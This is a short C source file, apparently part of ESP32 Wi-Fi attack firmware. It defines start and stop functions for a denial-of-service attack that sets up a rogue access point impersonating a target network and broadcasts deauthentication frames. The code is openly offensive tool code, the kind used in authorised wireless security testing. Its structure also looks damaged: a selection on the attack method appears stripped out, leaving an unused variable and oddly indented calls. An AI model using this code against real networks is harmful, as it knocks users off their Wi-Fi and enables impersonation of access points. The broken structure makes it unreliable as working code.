#include "deauth.h"
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"

#include "wifi_handler.h"

static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack...");
    method = attack_config->method;
    ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            attack_method_rogueap(attack_config->ap_record);
            attack_method_broadcast(attack_config->ap_record, 1);
}

void attack_dos_stop() {
    attack_method_broadcast_stop();
    // wifictl_mgmt_ap_start();
    //         wifictl_restore_ap_mac();
    ESP_LOGI(TAG, "DoS attack stopped");
}